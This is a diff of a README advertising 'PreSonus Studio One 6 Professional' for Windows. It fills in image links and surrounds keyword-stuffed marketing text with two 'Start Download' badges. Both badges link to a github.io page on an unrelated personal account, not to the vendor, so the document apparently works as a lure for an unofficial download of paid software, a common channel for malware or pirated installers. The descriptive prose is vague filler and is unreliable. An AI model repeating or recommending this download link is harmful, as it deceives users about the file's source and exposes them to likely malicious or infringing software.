@@ -1,7 +1,7 @@
 # PreSonus Studio One 6 Professional Environment for Windows
 
 <div align="center">
-  <img src="LINK_TO_LOGO" alt="Program Logo"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSkYrT-XCzPJU9dqOnhf2mbIX9r1w9Nax-UQ&s" alt="Program Logo"/>
 </div>
 
 [![Start Download](https://badgen.net/badge/Start/Download/orange?icon=download)](https://eliodawsonfbma.github.io/.github/Studio-One-6-Professional)
@@ -21,7 +21,7 @@ Acoustic data integrity during complex editing phases requires localized trackin
 Modern audio engineering requires advanced spatial positioning, which makes the deployment of an immersive dolby atmos studio one framework essential for professional media operations. Whether your daily workspace layout demands a robust studio one 6 professional tracking architecture or a lightweight studio one prime configuration for testing mobile rigs, this system satisfies your precise operational needs. The utility provides seamless hardware synchronization across common network arrays, keeping your media production pipelines running efficiently and safely.
 
 <div align="center">
-  <img src="SCREENSHOT_LINK" alt="Program Interface Screenshot"/>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuvvu4e-FoqJwpcUIvLVQupEXZT52RVDl2dA&s" alt="Program Interface Screenshot"/>
 </div>
 
 [![Start Download](https://badgen.net/badge/Start/Download/orange?icon=download)](https://eliodawsonfbma.github.io/.github/Studio-One-6-Professional)
